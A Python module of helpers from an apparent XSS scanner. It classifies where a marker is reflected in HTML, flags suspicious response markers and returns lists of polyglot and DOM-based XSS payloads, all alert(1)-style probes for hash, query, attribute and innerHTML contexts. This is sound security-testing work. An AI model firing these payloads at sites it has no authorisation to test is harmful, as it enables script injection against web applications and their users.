#!/usr/bin/env python3
"""XSS reflection analysis, payload generation, and context classification helpers.

Extracted from SmartXSSHunter to keep the facade lean.
These are pure helpers – no instance state, no service pattern.
"""

import re
from typing import Dict, Any, List


def is_suspicious_observation(observation: Dict[str, Any]) -> bool:
    """Check if an observation contains XSS-relevant signals."""
    diff = str(observation.get("diff", "")).lower()
    if diff == "reflected":
        return True
    body_lower = str(observation.get("body_snippet", "")).lower()
    suspicious_markers = [
        "<script",
        "&lt;script",
        "onerror",
        "onload",
        "javascript:",
        "alert(",
        "<img",
        "<svg",
    ]
    return any(marker in body_lower for marker in suspicious_markers)


def analyze_reflection(html: str, marker: str) -> List[Dict[str, str]]:
    """Classify where in HTML a payload marker is reflected.

    Returns a list of context dicts, e.g. [{"context": "JavaScript"}, ...].
    """
    contexts: List[Dict[str, str]] = []
    lower_html = html.lower()
    lower_marker = marker.lower()
    if lower_marker in lower_html:
        if re.search(rf"<script[^>]*>[^<]*{re.escape(marker)}", html, flags=re.IGNORECASE):
            contexts.append({"context": "JavaScript"})
        if re.search(rf"<!--[^>]*{re.escape(marker)}", html, flags=re.IGNORECASE):
            contexts.append({"context": "Comment"})
        if re.search(rf"=[\"'][^\"']*{re.escape(marker)}", html, flags=re.IGNORECASE):
            contexts.append({"context": "Attribute"})
        if re.search(rf">[^<]*{re.escape(marker)}[^<]*<", html, flags=re.IGNORECASE):
            contexts.append({"context": "HTML Body"})
    return contexts


def generate_polyglot_payloads() -> List[str]:
    """Return a list of polyglot XSS payloads spanning multiple contexts."""
    return [
        # 基本Polyglot（最も多くのコンテキストで動作）
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        # PNGヘッダー偽装Polyglot
        "GIF89a<script>alert(1)</script>",
        # 数値コンテキスト用（quotes不要）
        "1;alert(1)//",
        # Template/AngularJS用
        "{{constructor.constructor('alert(1)')()}}",
        # 属性コンテキスト用
        "'\" onmouseover=alert(1) //",
        # SVG animate用
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        # コメントアウトで囲む形
        "<!--<img src=--><img src=x onerror=alert(1)>-->",
        # styleコンテキスト脱出
        "</style><script>alert(1)</script>",
        # textareaコンテキスト脱出
        "</textarea><script>alert(1)</script>",
        # titleコンテキスト脱出
        "</title><script>alert(1)</script>",
        # Backtick利用（ES6）
        "`${alert(1)}`",
        # Eval利用
        "eval('alert(1)')",
        # 16進数エスケープ
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        # Unicodeエスケープ
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        # HTML5 entities
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        # Base64 Data URI
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # VBScript（IE用）
        "vbscript:msgbox(1)",
        # JavaScript偽装
        "javascript://%0aalert(1)",
        # Location変更
        "location='javascript:alert(1)'",
        # SetTimeout
        "setTimeout('alert(1)',0)",
        # 即時関数
        "(function(){alert(1)})()",
    ]


def generate_dom_xss_payloads(target_url: str) -> List[Dict[str, Any]]:
    """Generate DOM-based XSS payloads organized by context.

    Returns a list of payload dicts with context, payload, description,
    and detection_method fields.
    """
    # Hash fragment操作ペイロード（/#/searchなどのSPAルート向け）
    hash_payloads = [
        {
            "context": "hash",
            "payload": "#<img src=x onerror=alert(1)>",
            "description": "Basic hash fragment XSS",
            "detection_method": "hashchange_event",
        },
        {
            "context": "hash",
            "payload": "#javascript:alert(1)",
            "description": "Hash fragment with javascript: scheme",
            "detection_method": "hashchange_event",
        },
        {
            "context": "hash",
            "payload": "#eval(location.hash.slice(1))//",
            "description": "Hash fragment with eval",
            "detection_method": "hashchange_event",
        },
    ]

    # Search/query操作ペイロード
    search_payloads = [
        {
            "context": "search",
            "payload": "?<script>alert(1)</script>",
            "description": "URL query parameter XSS",
            "detection_method": "url_parse",
        },
        {
            "context": "search",
            "payload": "?callback=<script>alert(1)</script>",
            "description": "JSONP callback XSS",
            "detection_method": "url_parse",
        },
    ]

    # document.URL/document.location操作
    url_payloads = [
        {
            "context": "url",
            "payload": "<script>alert(document.URL)</script>",
            "description": "Document URL reflection",
            "detection_method": "dom_source",
        },
        {
            "context": "url",
            "payload": "<script>alert(document.location)</script>",
            "description": "Document location reflection",
            "detection_method": "dom_source",
        },
    ]

    # innerHTML/outerHTML操作（DOM sink）
    sink_payloads = [
        {
            "context": "sink",
            "payload": "<img src=x onerror=alert(1)>",
            "description": "innerHTML sink with image error",
            "detection_method": "dom_mutation",
        },
        {
            "context": "sink",
            "payload": "<svg onload=alert(1)>",
            "description": "innerHTML sink with SVG onload",
            "detection_method": "dom_mutation",
        },
        {
            "context": "sink",
            "payload": "<body onpageshow=alert(1)>",
            "description": "innerHTML sink with pageshow event",
            "detection_method": "dom_mutation",
        },
    ]

    dom_payloads: List[Dict[str, Any]] = []
    dom_payloads.extend(hash_payloads)
    dom_payloads.extend(search_payloads)
    dom_payloads.extend(url_payloads)
    dom_payloads.extend(sink_payloads)
    return dom_payloads
